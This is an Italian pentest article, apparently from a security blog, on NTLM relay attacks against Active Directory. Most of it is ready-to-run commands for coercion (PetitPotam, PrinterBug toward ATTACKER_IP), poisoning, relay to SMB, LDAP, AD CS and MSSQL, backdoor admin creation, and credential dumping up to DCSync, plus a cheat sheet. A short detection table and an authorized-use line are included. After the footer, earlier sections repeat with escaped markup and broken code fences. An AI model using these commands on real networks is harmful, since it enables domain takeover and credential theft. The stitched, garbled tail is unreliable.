| Lettura file server | `BULK INSERT`, OPENROWSET |

***

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```
IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo
```

***

## Decision tree — cosa usi in base a cosa trovi

```
HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap://DC_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps://DC_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp_cmdshell
│           → ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
    └── mitm6 → LDAPS relay → RBCD → getST → DA
```

***

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
```

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'CertPass123' --cert-outfile-path /tmp/ws01

# Cross-protocol — SMB in → LDAP out (rimuove MIC)

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support --remove-mic

# Interactive LDAP shell — comandi diretti su AD

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support -i

# ntlmrelayx stampa la porta → es: "Started interactive LDAP client via TCP on 127.0.0.1:XXXX"

nc 127.0.0.1 XXXX   # → add\_user / add\_user\_to\_group / dump\_domain ...

```

---

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```

LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Tutto ciò che LDAP permette | + |
| Shadow Credentials | Write su msDS-KeyCredentialLink |
| Add computer account | MachineAccountQuota > 0 |
| RBCD completo | Write sul computer object target |

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
